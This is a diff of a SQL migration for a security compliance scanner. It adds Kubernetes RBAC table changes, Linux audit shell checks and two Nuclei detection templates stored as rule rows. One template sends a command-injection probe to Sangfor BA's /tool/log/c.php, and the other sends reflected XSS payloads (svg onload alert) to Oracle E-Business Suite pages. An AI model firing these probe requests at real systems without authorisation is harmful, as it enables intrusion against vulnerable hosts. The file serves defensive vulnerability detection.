@@ -1,4 +1,8 @@
 
+-- -----------------
+-- image repo setting
+-- -----------------
+
 CREATE TABLE IF NOT EXISTS `image_repo_setting` (
     `id`                         varchar(50)        NOT NULL COMMENT 'ID',
     `repo_id`                    varchar(50)        DEFAULT NULL COMMENT '镜像仓库ID',
@@ -8,6 +12,10 @@ CREATE TABLE IF NOT EXISTS `image_repo_setting` (
     `update_time`                bigint(13)         DEFAULT NULL COMMENT '修改时间',
     PRIMARY KEY (`id`)
     ) ENGINE = InnoDB DEFAULT CHARSET = utf8mb4 COLLATE = utf8mb4_bin;
+
+-- -----------------
+-- nuclei rule
+-- -----------------
 
 INSERT INTO `rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `plugin_id`, `plugin_name`, `plugin_icon`, `last_modified`, `flag`, `scan_type`, `suggestion`) VALUES ('8909fff6-52a4-433c-9504-476149acf15c', 'Nuclei Sangfor BA - 远程代码执行检测', 1, 'LowRisk', 'Nuclei Sangfor BA - 远程代码执行检测，深信服产品允许远程未经身份验证的用户使产品执行任意命令。无返回结果属于合规，否则属于\"不合规\"', 'id: sangfor-ba-rce\n\ninfo:\n  name: Sangfor BA - Remote Code Execution\n  author: ritikchaddha\n  severity: critical\n  description: |\n    Sangfor products allow remote unauthenticated users to cause the product to execute arbitrary commands.\n  reference:\n    - https://mobile.twitter.com/sec715/status/1406886851072253953\n  classification:\n    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\n    cvss-score: 10.0\n    cwe-id: CWE-77\n  metadata:\n    verified: true\n    fofa-query: app=\"sangfor\"\n  tags: rce,sangfor\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/tool/log/c.php?strip_slashes=md5&host={{randstr}}\"\n\n    matchers-condition: and\n    matchers:\n      - type: word\n        part: body\n        words:\n          - \'{{md5(\"{{randstr}}\")}}\'\n\n      - type: status\n        status:\n          - 200\n\n# Enhanced by mp on 2022/05/30', '[]', 'hummer-nuclei-plugin', 'Nuclei', 'nuclei.png', concat(unix_timestamp(now()), '001'), 1, 'nuclei', NULL);
 INSERT INTO `rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `plugin_id`, `plugin_name`, `plugin_icon`, `last_modified`, `flag`, `scan_type`, `suggestion`) VALUES ('6f3a9f9b-6d84-482d-a91a-3fb94f888a34', 'Nuclei Oracle 电子商务套件 — 跨站点脚本检测', 1, 'LowRisk', 'Nuclei Oracle 电子商务套件 — 跨站点脚本检测，无返回结果属于合规，否则属于\"不合规\"', 'id: oracle-ebs-xss\n\ninfo:\n  name: Oracle E-Business Suite - Cross-Site Scripting\n  author: dhiyaneshDk\n  severity: medium\n  reference:\n    - https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite.pdf\n    - http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf\n  tags: oracle,xss,ebs\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/OA_HTML/jtfLOVInProcess.jsp%3FAAA%3DAAAAAAAAAA%27%22%3E%3Csvg%2Fonload%3Dalert(\'{{randstr}}\')%3E\"\n      - \"{{BaseURL}}/OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert(\'{{randstr}}\')%3E\"\n      - \"{{BaseURL}}/OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert(\'{{randstr}}\')%3E\"\n\n    matchers-condition: and\n    matchers:\n      - type: word\n        words:\n          - \"<svg/onload=alert(\'{{randstr}}\')>\"\n        part: body\n\n      - type: status\n        status:\n          - 200\n      - type: word\n        words:\n          - \"text/html\"\n        part: header\n\n# Enhanced by md on 2022/09/19', '[]', 'hummer-nuclei-plugin', 'Nuclei', 'nuclei.png', concat(unix_timestamp(now()), '001'), 1, 'nuclei', NULL);
@@ -53,13 +61,19 @@ INSERT INTO `rule_inspection_report_mapping` (`rule_id`, `report_id`) VALUES ('4
 INSERT INTO `rule_inspection_report_mapping` (`rule_id`, `report_id`) VALUES ('6f3a9f9b-6d84-482d-a91a-3fb94f888a34', '48');
 INSERT INTO `rule_inspection_report_mapping` (`rule_id`, `report_id`) VALUES ('8909fff6-52a4-433c-9504-476149acf15c', '48');
 
+-- -----------------
+-- k8s rbac
+-- -----------------
+
 CREATE TABLE IF NOT EXISTS `cloud_native_source_rbac_node` (
     `id`                         varchar(50)        NOT NULL COMMENT 'ID',
-    `source_id`                  varchar(50)        DEFAULT NULL COMMENT 'sourceID',
+    `k8s_id`                     varchar(50)        DEFAULT NULL COMMENT 'sourceID',
     `name`                       varchar(512)       DEFAULT NULL COMMENT 'name',
     `namespace`                  varchar(512)       DEFAULT NULL COMMENT 'namespace',
     `value`                      int(11)            DEFAULT NULL COMMENT 'value',
+    `symbol`                     varchar(512)       DEFAULT NULL COMMENT 'symbol(本地图片引用地址)',
     `symbolSize`                 int(11)            DEFAULT NULL COMMENT 'symbolSize',
+    `order`                      bigint(13)         DEFAULT NULL COMMENT 'order',
     `category`                   varchar(128)       DEFAULT NULL COMMENT 'category',
     `create_time`                bigint(13)         DEFAULT NULL COMMENT '创建时间',
     PRIMARY KEY (`id`)
@@ -67,18 +81,35 @@ CREATE TABLE IF NOT EXISTS `cloud_native_source_rbac_node` (
 
 CREATE TABLE IF NOT EXISTS `cloud_native_source_rbac_link` (
     `id`                         varchar(50)        NOT NULL COMMENT 'ID',
-    `source_id`                  varchar(50)        DEFAULT NULL COMMENT 'sourceID',
+    `k8s_id`                     varchar(50)        DEFAULT NULL COMMENT 'sourceID',
     `source`                     varchar(50)        DEFAULT NULL COMMENT 'source',
-    `target`                     varchar(128)       DEFAULT NULL COMMENT 'target',
+    `target`                     varchar(50)        DEFAULT NULL COMMENT 'target',
     `create_time`                bigint(13)         DEFAULT NULL COMMENT '创建时间',
     PRIMARY KEY (`id`)
     ) ENGINE = InnoDB DEFAULT CHARSET = utf8mb4 COLLATE = utf8mb4_bin;
 
 CREATE TABLE IF NOT EXISTS `cloud_native_source_rbac_relation` (
     `id`                         varchar(50)        NOT NULL COMMENT 'ID',
-    `source_id`                  varchar(50)        DEFAULT NULL COMMENT 'sourceId',
+    `k8s_id`                     varchar(50)        DEFAULT NULL COMMENT 'sourceId',
     `link_id`                    varchar(50)        DEFAULT NULL COMMENT 'linkId',
     `name`                       varchar(512)       DEFAULT NULL COMMENT 'name',
     `create_time`                bigint(13)         DEFAULT NULL COMMENT '创建时间',
     PRIMARY KEY (`id`)
     ) ENGINE = InnoDB DEFAULT CHARSET = utf8mb4 COLLATE = utf8mb4_bin;
+
+
+-- -----------------
+-- server rule
+-- -----------------
+
+INSERT INTO `server_rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `last_modified`, `flag`, `type`) VALUES ('c0f065e4-f205-4b1d-9d1d-a037f9e31e9d', 'Linux 系统中隐藏异常文件检测', 1, 'HighRisk', '检测 Linux 系统中是否存在隐藏异常文件', 'hideFile=$(find / -xdev -mount \\( -name \"..*\" -o -name \"...*\" \\) 2> /dev/null)\nif [  -z \"${hideFile}\" ];then\n  echo \"HummerSuccess:不存在隐藏文件，符合要求\"\nelse\n  echo \"HummerError:${hideFile}是隐藏文件，建议审视\" \nfi', '[]', concat(unix_timestamp(now()), '001'), 1, 'linux');
+INSERT INTO `server_rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `last_modified`, `flag`, `type`) VALUES ('29bac3a8-6cde-49a8-968e-45745d917a08', 'Linux 系统中非 root 账户 uid 检测', 1, 'LowRisk', '查看 LInux 系统中非 root 账户 uid 为 0 的账户', 'UIDS=`awk -F[:] \'NR!=1{print $3}\' /etc/passwd`\nflag=0\nfor i in $UIDS\n\ndo\nif [ $i = 0 ];then\n\n  echo \"HummerError:存在非root账号的账号UID为0，不符合要求\"\n\nelse\n flag=1\nfi\ndone\nif [ $flag = 1 ];then\n\n  echo \"HummerSuccess:不存在非root账号的账号UID为0，符合要求\"\n\nfi', '[]', concat(unix_timestamp(now()), '001'), 1, 'linux');
+INSERT INTO `server_rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `last_modified`, `flag`, `type`) VALUES ('a9c11f7e-ba44-416e-bbfa-cd4d96f8165f', 'Linux 账户配置自动注销时间检测', 1, 'LowRisk', '检测 Linux 账户是否配置自动注销时间', 'checkTimeout=$(cat /etc/profile | grep TMOUT | awk -F[=] \'{print $2}\')\nif [ $? -eq 0 ];then\n  TMOUT=`cat /etc/profile | grep TMOUT | awk -F[=] \'{print $2}\'`\n\n  if [[ $checkTimeout -le 600 ]] && [[  $checkTimeout -ge 10 ]];then\n    echo \"HummerSuccess: 账号超时时间${TMOUT}秒,符合要求\"\n  else\n    echo \"HummerError:账号超时时间${TMOUT}秒,不符合要求,建议设置小于 600 秒\"\n  fi\nelse\n  echo \"HummerError:账号超时不存在自动注销,不符合要求,建议设置小于 600 秒\"\nfi', '[]', concat(unix_timestamp(now()), '001'), 1, 'linux');
+INSERT INTO `server_rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `last_modified`, `flag`, `type`) VALUES ('e0ba707c-4a08-490e-93fb-1e98b1db0b3b', 'Linux resolve 中 DNS 服务器检测', 1, 'MediumRisk', '检测 Linux resolve 中 DNS 服务器是否正确', 'function check_ip() {\n  IP=$1\n  VALID_CHECK=$(echo \"$IP\"|awk -F. \'$1<=255&&$2<=255&&$3<=255&&$4<=255{print \"yes\"}\')\n  if echo \"$IP\"|grep -E \"^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$\" > /dev/null;then\n    if [ ${VALID_CHECK:-no} == \"yes\" ]; then\n      echo \"HummerSuccess: DNS 服务器 $IP 有效\"\n    else\n      echo \"HummerError: DNS 服务器 $IP 是个无效IP\"\n    fi\n  else\n    echo \"HummerError: 无效IP $IP  !\"\n  fi\n}\n\nfor ip in `cat /etc/resolv.conf 2>/dev/null| grep -E -o \"([0-9]{1,3}[\\.]){3}[0-9]{1,3}\"`\ndo\ncheck_ip $ip\ndone', '[]', concat(unix_timestamp(now()), '001'), 1, 'linux');
+INSERT INTO `server_rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `last_modified`, `flag`, `type`) VALUES ('c43ab09e-0c6c-4b2e-866d-3426477a6f3c', 'Linux hosts 记录中服务器地址检测', 1, 'LowRisk', '检测 Linux hosts 记录中服务器地址是否正确', 'function check_ip() {\n  IP=$1\n  VALID_CHECK=$(echo \"$IP\"|awk -F. \'$1<=255&&$2<=255&&$3<=255&&$4<=255{print \"yes\"}\')\n  if echo \"$IP\"|grep -E \"^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$\" > /dev/null;then\n    if [ ${VALID_CHECK:-no} == \"yes\" ]; then\n      echo \"HummerSuccess: hosts 服务器 $IP 有效\"\n    else\n      echo \"HummerError: hosts 服务器 $IP 是个无效IP\"\n    fi\n  else\n    echo \"HummerError: 无效IP $IP  !\"\n  fi\n}\n\nfor ip in `cat /etc/hosts|awk \'{print $1}\'|grep -E \"^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$\"`\ndo\ncheck_ip $ip\ndone', '[]', concat(unix_timestamp(now()), '001'), 1, 'linux');
+
+INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('c43ab09e-0c6c-4b2e-866d-3426477a6f3c', 'server');
+INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('e0ba707c-4a08-490e-93fb-1e98b1db0b3b', 'server');
+INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('a9c11f7e-ba44-416e-bbfa-cd4d96f8165f', 'server');
+INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('29bac3a8-6cde-49a8-968e-45745d917a08', 'server');
+INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('c0f065e4-f205-4b1d-9d1d-a037f9e31e9d', 'server');
